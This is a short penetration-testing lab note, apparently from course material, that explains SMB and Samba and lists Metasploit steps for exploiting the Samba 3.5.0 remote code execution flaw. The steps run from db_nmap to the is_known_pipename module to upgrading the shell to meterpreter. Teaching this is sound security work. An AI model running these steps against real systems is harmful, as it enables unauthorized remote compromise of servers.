
### What is Samba ?

+ SMB (Server Message Block) is a network file sharing protocol that is used to facilitate the sharing of files and peripherals between computers on a local network (LAN).

+ SMB uses port 445 (TCP). However, originally, SMB ran on top of NetBIOS using port 139.

+ Samba is the Linux implementation of SMB, and allows Windows systems to access Linux shares and devices.

+ Samba V3.5.0 is vulnerable to a remote code execution vulnerability, allowing a malicious client to upload a shared library to a writable share, and then cause the server to load and execute it. 

### How to exploit ?

1. Scan the target with `db_nmap` within our workspace to identify the version of Samba.

2. Exploiting Samba by loading an arbitrary module.
```
use exploit/linux/samba/is_known_pipename
```

3. To check if the target is vulnerable, we'll use `check` command.

4. Background this shell session and upgrade it to a meterpreter session.
```
use post/multi/manage/shell_to_meterpreter
```